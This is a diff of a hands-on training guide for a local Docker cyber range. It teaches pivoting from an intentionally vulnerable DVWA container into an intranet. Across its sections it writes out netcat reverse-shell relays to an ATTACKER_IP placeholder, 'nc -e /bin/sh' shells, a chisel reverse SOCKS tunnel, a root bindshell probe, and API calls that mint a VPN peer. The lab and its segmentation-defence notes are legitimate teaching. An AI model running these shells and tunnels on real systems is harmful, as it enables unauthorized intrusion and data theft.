@@ -31,8 +31,30 @@ The canonical story of the CyberRange is exactly that: **pwn DVWA from the outsi
 # Prerequisites
 - The CyberRange running: `cd CyberRange && docker compose up -d` (profiles `dmz` + `intranet` + `vpn`; profile options are documented in `CyberRange/README.md`).
 - DVWA reachable at `http://localhost:8081`.
-- A machine to attack from: your own laptop, the optional `kali-cai` attacker box of the range, or any host with `curl`, `nc` and Python.
+- A machine to attack from: your own laptop or a separate lab attacker VM with `curl`, OpenBSD `nc` and Python 3. There is no attacker service in this Compose file.
 - A VPN peer for yourself (optional - it is the "legitimate" way in, useful to compare with the attack paths below): admin UI at `http://localhost:51821`, credentials in `CyberRange/.env`.
+
+## Instructor setup and repeatable checks
+
+Allow about 90 minutes: setup/foothold 20, enumeration 15, relays/SOCKS 35, defense and cleanup 20. Disconnect the participant VPN for the pivot exercises. A Linux Docker host can often reach bridge addresses directly; use a separate participant laptop/VM with no intranet route to demonstrate isolation. Docker Desktop normally does not expose bridge IPs directly.
+
+From the repository root, start only the core targets (DVWA's database starts as a dependency):
+```bash
+docker compose --env-file CyberRange/.env.example -f CyberRange/docker-compose.yml up -d corporate-site dvwa intranet-wiki metasploitable2
+# Confirm DVWA is tri-homed (all three legs appear):
+docker inspect cyberrange-dvwa | grep -E "10\.5\.(10|15|20)\."
+# Confirm DVWA reaches the intranet wiki, and a DMZ-only box does not:
+docker exec cyberrange-dvwa curl -s -o /dev/null -w "dvwa->wiki=%{http_code}\n" --max-time 5 http://10.5.20.10/
+docker exec cyberrange-corporate-site wget -qO- --timeout=2 http://10.5.20.10/ ; echo "dmz-only exit=$? (non-zero = isolated, expected)"
+```
+The sample environment suffices for the local core lab. For shared hosting, copy it to `CyberRange/.env`, configure the bind address and credentials, and use that file instead. Older target images may require amd64 emulation on ARM hosts. Wait for services to finish booting before testing. Initialize DVWA through `/setup.php`; do not reset a shared database without coordinating with the class.
+
+These checks use Docker operator access and are bounded and non-destructive: they verify the core topology and HTTP/TCP access, not completion of the interactive exercises. Optional VPN, monitoring, mail and desktop goals require those services to be started separately.
+
+Stop only these workshop services when finished (preserves data):
+```bash
+docker compose --env-file CyberRange/.env.example -f CyberRange/docker-compose.yml stop corporate-site dvwa dvwa-db intranet-wiki metasploitable2
+```
 
 # Lab topology recap
 The range is split into three Docker networks. DVWA is the **only** service with a leg in all three.
@@ -43,11 +65,11 @@ The range is split into three Docker networks. DVWA is the **only** service with
 | DB tier | `10.5.15.0/24` | dvwa-db `.10`, dvwa `.20` | DVWA only (dvwa-db:3306) |
 | Intranet | `10.5.20.0/24` | wg-easy `.2`, dokuwiki `.10`, sftpgo `.11`, metasploitable2 `.12`, grafana `.14`, prometheus `.15`, blackbox `.16`, dvwa `.20`, workstations `.21`/`.22` | VPN only - except for DVWA's third leg |
 
-Verified reachability facts you can rely on:
+Expected reachability (verify against your running images with the checks in the setup section above):
 - A DMZ-only service (juice-shop, corporate-site, mailpit) **cannot** reach `10.5.20.x` or `10.5.15.x`.
 - DVWA **can** reach the whole intranet: `10.5.20.10` (HTTP 200), `10.5.20.12` (many open ports), `10.5.20.2:51821` (401 unauth = reachable).
-- DVWA's container has `nc` (OpenBSD variant), `curl`, `python3` and `php`. No `wget`, no `ssh`, no `socat` - adapt your tooling accordingly.
-- Two documented exceptions worth knowing (see `CyberRange/README.md`): blackbox-exporter is dual-homed (`10.5.10.20:9115`, abusable `/probe` endpoint) and grafana stores the wg-easy + mailpit API credentials in its provisioned Infinity datasource.
+- Check installed tools first: `docker exec cyberrange-dvwa sh -c 'command -v nc; command -v curl; command -v python3; command -v php'`. PHP is sufficient for enumeration; Python and netcat availability depends on the image.
+- Two documented exceptions worth knowing (see `CyberRange/README.md`): blackbox-exporter is dual-homed (`10.5.10.20:9115`, abusable `/probe` endpoint). Grafana provisions a wg-easy authorization header in `secureJsonData`; this is not a plaintext credential disclosure through its UI. Mailpit has no authentication configured here.
 
 # Phase 1 - Foothold on DVWA
 1. Open `http://localhost:8081` and log in with `admin` / `password`.
@@ -116,96 +138,78 @@ Notes:
 - This pivot is "static": every request is one curl invocation. Fine for enumeration and data theft, useless for interactive shells. The next pivots solve that.
 
 ## Pivot 2: Reverse shell relayed through DVWA with netcat
-metasploitable2 lives deep in the intranet: it cannot connect directly to your laptop, and you cannot connect to it. DVWA, however, is dual-homed. Use it as the middle box.
+Metasploitable2 has no published ports. Use tri-homed DVWA as the middle box. Docker bridge segmentation does not necessarily block outbound connections to your laptop: test that separately, rather than assuming there is no route.
 
-On your laptop (attacker), open a listener:
-```bash
-nc -lvp 4445
-```
-On DVWA (the middle box), start a listener that pipes everything to you:
-```bash
-docker exec cyberrange-dvwa sh -c 'nc -lvp 4444 | nc <ATTACKER_IP> 4445'
-```
-Replace `<ATTACKER_IP>` with an address DVWA can reach: your host's LAN IP or `host.docker.internal` (Docker Desktop).
+Use three terminals. Commands below use OpenBSD netcat syntax; the host listener on macOS also accepts `nc -l 4445`.
 
-Finally, on metasploitable2, fire the shell back through the relay (connect from your VPN access or from DVWA's curl to port 1524 - the built-in root bindshell, verified: `printf "id\n" | nc 10.5.20.12 1524` answers `uid=0(root)` - if you want a bootstrap shell first):
-```bash
-nc 10.5.20.20 4444 -e /bin/sh
-```
-Your `nc -lvp 4445` should receive the ms2 shell: `id` -> `uid=0(root)`. The command is relayed like this: `ms2 -> 10.5.20.20:4444 -> DVWA -> <ATTACKER_IP>:4445`.
+1. On your laptop, listen with `nc -l 4445`.
+2. On DVWA, run a bidirectional FIFO relay. Replace `ATTACKER_IP` with your host's LAN IP or `host.docker.internal` on Docker Desktop:
+   ```bash
+   docker exec -it cyberrange-dvwa sh -c '
+     d=$(mktemp -d)
+     trap "rm -rf $d" EXIT
+     mkfifo "$d/pipe"
+     nc -l 4444 <"$d/pipe" | nc ATTACKER_IP 4445 >"$d/pipe"
+   '
+   ```
+3. For a reproducible operator-assisted bootstrap, run:
+   ```bash
+   docker exec cyberrange-metasploitable2 nc 10.5.20.20 4444 -e /bin/sh
+   ```
+4. Type `id` in the laptop listener. Expect `uid=0(root)`. Type `exit` and stop any remaining relay/listener processes with Ctrl-C.
 
-For a fully interactive (bidirectional) relay, upgrade the middle box with a FIFO:
-```bash
-docker exec cyberrange-dvwa sh -c 'mkfifo /tmp/p; nc -lvp 4444 </tmp/p | nc <ATTACKER_IP> 4445 >/tmp/p'
-```
-Why the middle box matters: ms2 has no route to your laptop (segmentation), and you have no route to ms2 (no VPN). DVWA breaks the isolation because of its third leg - exactly the misconfiguration this workshop is about. Also note the OpenBSD `nc` on DVWA has no `-e`, so relays must use pipes/FIFOs; ms2's traditional netcat does have `-e`.
+The operator bootstrap is a simulation of prior code execution on the internal host; it is not evidence of exploitation. A simple `nc ... | nc ...` pipe only forwards one direction and cannot carry an interactive shell. DVWA's OpenBSD netcat has no `-e`; the traditional netcat in Metasploitable2 does.
 
 ## Pivot 3: Full dynamic SOCKS pivot
-A SOCKS proxy on the pivot lets you use **all** your local tools (`nmap`, `curl`, browsers) through the tunnel as if you were on DVWA. The classic tool is SSH:
-```bash
-ssh -D 9050 user@10.5.20.12     # SOCKS proxy on localhost:9050
-proxychains nmap -sT -Pn 10.5.20.10
-```
-But **DVWA has no SSH server**. This works against any SSH host (metasploitable2, sftpgo, the workstations) once you have credentials there.
+A reverse SOCKS tunnel lets laptop TCP clients reach internal services through DVWA without a VPN. Obtain matching [Chisel release binaries](https://github.com/jpillora/chisel/releases) for your laptop OS/CPU and DVWA's Linux CPU (`docker exec cyberrange-dvwa uname -m`). Unpack them before the session; an amd64 container needs the linux_amd64 binary even on an ARM laptop. Name the laptop binary `chisel` and the Linux binary `chisel-linux`.
 
-For DVWA itself, use its `python3` instead:
-- **Option A - reverse SOCKS with chisel** (DVWA can reach the Internet, it is in the DMZ). Download a static chisel binary with curl and run:
-  ```bash
-  # on your laptop
-  ./chisel server --reverse --port 8082
-  # on DVWA
-  curl -LO https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz
-  gunzip chisel_1.9.1_linux_amd64.gz && chmod +x chisel_1.9.1_linux_amd64
-  ./chisel_1.9.1_linux_amd64 client <ATTACKER_IP>:8082 R:socks
-  # now on your laptop: proxychains curl http://10.5.20.10/
-  ```
-- **Option B - python3 relay scripts**: if internet is not available from DVWA, upload small `python3` TCP-relay/socks snippets through the DVWA **File Upload** module and run them with `python3 /tmp/relay.py`. The same FIFO trick as Pivot 2 generalized to many ports (a listener per intranet port, each piped to your host).
+On the laptop, start the server (allow TCP 8082 through the lab host firewall):
+```bash
+chmod +x ./chisel
+./chisel server --reverse --port 8082 --auth workshop:lab-only
+```
+In another terminal, stage the client as the operator, then run it as the web account. Replace `ATTACKER_IP` as above:
+```bash
+docker cp ./chisel-linux cyberrange-dvwa:/tmp/chisel
+docker exec cyberrange-dvwa chmod 755 /tmp/chisel
+docker exec -it --user www-data cyberrange-dvwa /tmp/chisel client \
+  --auth workshop:lab-only http://ATTACKER_IP:8082 R:127.0.0.1:1080:socks
+```
+On the laptop:
+```bash
+curl --noproxy '' --socks5-hostname 127.0.0.1:1080 --max-time 10 http://10.5.20.10/
+```
+Expect the wiki HTML or an installation redirect. Configure the browser for SOCKS5 `127.0.0.1:1080` to explore the internal web services. For proxychains, explicitly configure `socks5 127.0.0.1 1080`; a bounded scan is `proxychains4 nmap -sT -Pn -n -p 80,22 10.5.20.12`. SOCKS does not carry nmap raw SYN scans or ICMP discovery. Stop the client/server after the exercise and remove `/tmp/chisel`.
+
+SSH `-D` is an alternative only after the SSH endpoint is reachable. Direct `ssh -D ... 10.5.20.12` from an isolated laptop cannot establish the first pivot. SFTPGo is a file transfer service, not a general SSH shell/tunneling server.
 
 ## Pivot 4: Mint your own VPN peer (become an employee)
-Once DVWA is pwned, the cleanest lateral move is to stop pivoting altogether and become a legitimate network member. wg-easy's admin UI is reachable from the intranet leg (`10.5.20.2:51821`) and its API only needs Basic auth. The password lives in `CyberRange/.env` (`WG_ADMIN_PASSWORD`) - and, in the range, it is also leaked by grafana's provisioned Infinity datasource (default `admin`/`admin`, dashboard credentials for the 51821 UI). Get it either way, then from DVWA:
+This is an optional instructor-assisted comparison, not a required exploitation step. Start the VPN service separately, use an instructor-issued admin credential, and browse `http://10.5.20.2:51821` through the SOCKS browser. Log in, create a temporary `pivot-proof` peer, download its configuration, then activate it in WireGuard. The VPN endpoint must point to the reachable lab server and its UDP port must be accessible. Confirm intranet access, disconnect, then delete the temporary peer and local configuration.
 
-```bash
-# 1. List current VPN peers (verify credentials)
-docker exec cyberrange-dvwa curl -s -u "admin:<WG_ADMIN_PASSWORD>" http://10.5.20.2:51821/api/client
-
-# 2. Create your own peer
-docker exec cyberrange-dvwa curl -s -u "admin:<WG_ADMIN_PASSWORD>" \
-  -X POST http://10.5.20.2:51821/api/client \
-  -H "Content-Type: application/json" \
-  -d '{"name":"pivot-proof","expiresAt":null}'
-
-# 3. (cleanup after the exercise) delete it, using the id returned by step 2
-docker exec cyberrange-dvwa curl -s -u "admin:<WG_ADMIN_PASSWORD>" \
-  -X DELETE http://10.5.20.2:51821/api/client/<id>
-```
-Retrieve the peer configuration (documented in the wg-easy API) and import it into your WireGuard client: you now route `10.5.20.0/24` from your own laptop - the attacker "became an employee". This is why `WG_ADMIN_PASSWORD` has no default and why the admin UI deserves a dedicated loopback binding (see the CyberRange README, "Pivoting and isolation").
+Do not assume wg-easy v15 accepts Basic authentication on `/api/client`, or that Grafana reveals its encrypted `secureJsonData` values. Use the deployed version's UI and verify its API before automating it. Reading `CyberRange/.env` as the operator is an assisted credential handoff, not an attacker discovery. The sample environment has a known training password; change it for a shared session.
 
 # Phase 4 - Lateral movement goals
 Choose your own adventure, all from the pivoted position:
 - **Own metasploitable2** (`10.5.20.12`): `msfadmin` / `msfadmin` over SSH or telnet; or the famous root bindshell on port `1524`:
   ```bash
-  docker exec cyberrange-dvwa sh -c 'echo id | nc 10.5.20.12 1524'
+  docker exec cyberrange-dvwa sh -c 'printf "id\nexit\n" | nc -w 3 10.5.20.12 1524'
   ```
   Then enumerate its many services (21, 22, 23, 25, 111, 139, 445, 512-514, 1099, 2121, 3306, 3632, 5432, 6667, 6697, 8009, 8180, 8787) for more practice.
-- **Own the workstations** (`https://10.5.20.21:3001`, `https://10.5.20.22:3001`): first steal credentials from grafana (`10.5.20.14:3000`, `admin`/`admin` -> provisioned dashboards and Infinity datasource hold wg-easy/mailpit API creds), then log into the desktops.
+- **Inspect the optional workstations** through the SOCKS browser (`https://10.5.20.21:3001`, `https://10.5.20.22:3001`). These use self-signed certificates. The Compose configuration does not set desktop credentials; VPN credentials are not desktop credentials.
 - **Read the company mail** (mailpit, reachable from DVWA on the DMZ leg):
   ```bash
   docker exec cyberrange-dvwa curl -s http://10.5.10.13:8025/api/v1/messages
-  docker exec cyberrange-dvwa curl -s http://10.5.10.13:8025/api/v1/message/<ID>/raw
-  docker exec cyberrange-dvwa curl -s -X POST http://10.5.10.13:8025/api/v1/send \
-    -H "Content-Type: application/json" \
-    -d '{"to":[{"email":"ceo@wocsa-corp.local"}],"subject":"Urgent","text":"spoofed"}'
+  docker exec cyberrange-dvwa curl -s 'http://10.5.10.13:8025/api/v1/message/REPLACE_WITH_ID/raw'
   ```
 
 # Defense & detection
-- **Verify the segmentation works**: from a DMZ-only container, the intranet must be unreachable:
+- **Verify segmentation against listening services**: pair each negative check (from a DMZ-only box) with a successful check from DVWA. For a manual wiki check:
   ```bash
   docker exec cyberrange-corporate-site wget -qO- --timeout=2 http://10.5.20.10/ ; echo "exit=$?"
-  docker exec cyberrange-corporate-site wget -qO- --timeout=2 http://10.5.15.10/ ; echo "exit=$?"
   ```
-  Both fail - unlike the same commands on DVWA. This is the single most important lesson: DVWA is reachable *because* someone gave it three legs.
+  This should fail while the wiki HTTP request from DVWA succeeds. Test the database on TCP 3306, not HTTP port 80 (which is closed even without isolation). This is the single most important lesson: DVWA is reachable *because* someone gave it three legs.
 - **Least privilege network legs**: DMZ apps need a DMZ leg, not an intranet one. Databases need a private tier reachable only by their application. Review every container's networks like a firewall rule.
-- **Why monitoring would spot the pivot**: the range's own grafana dashboards and blackbox exporter watch every service; a flood of new connections from `10.5.20.20` to unusual ports, a new wg-easy peer named `pivot-proof`, or mailpit API hits from a web container are all visible anomalies. A SOC would correlate exactly these events.
+- **Detection limits**: the bundled Prometheus/blackbox dashboards show service health, not connection histories or peer-creation audit events. To investigate a pivot, collect application logs and packet captures on the relevant interfaces. Record source/destination addresses and timestamps during the exercise.
 - **Patch and segment DVWA**: it is intentionally vulnerable (low security level, command injection, file upload) - in production it should be patched, hardened, and, above all, stripped of its intranet leg.
 
 # Takeaways checklist
@@ -214,8 +218,8 @@ Choose your own adventure, all from the pivoted position:
 - [ ] Enumerated `10.5.20.0/24` from DVWA with the php/python3 port-80 sweep
 - [ ] Reached the wiki (`10.5.20.10`), metasploitable2 (`10.5.20.12`) and wg-easy (`10.5.20.2:51821`) through the curl relay
 - [ ] Caught a metasploitable2 root shell through the DVWA nc relay
-- [ ] Set up a SOCKS pivot (ssh `-D` on an SSH host, or chisel/python3 on DVWA) and browsed the intranet with `proxychains`
-- [ ] Minted and then deleted a WireGuard peer via the wg-easy API
+- [ ] Set up a reverse Chisel SOCKS pivot on DVWA and browsed the intranet with `proxychains`
+- [ ] Optionally created and deleted a WireGuard peer through the UI with instructor credentials
 - [ ] Verified that a DMZ-only container cannot reach the intranet
 - [ ] Read company mail through the mailpit API
 
@@ -228,4 +232,4 @@ Choose your own adventure, all from the pivoted position:
 - [Metasploitable2 guide](https://docs.rapid7.com/metasploitable/)
 
 # Summary report
-Pwned DVWA at `localhost:8081`, confirmed its intranet leg `10.5.20.20`, enumerated `10.5.20.0/24`, relayed HTTP and a root reverse shell from metasploitable2 through DVWA, established a SOCKS pivot, minted a wg-easy VPN peer via the verified API, and exfiltrated company mail from `10.5.10.13:8025` - while DMZ-only containers stayed locked out of the intranet.
+Record what you actually verified: image versions, attacker location, foothold identity, reachable ports, a command/response through the relay, a SOCKS HTTP response, and positive/negative isolation checks. Distinguish operator-assisted steps from exploitation. Record optional exercises skipped and remove temporary binaries, listeners and VPN peers.
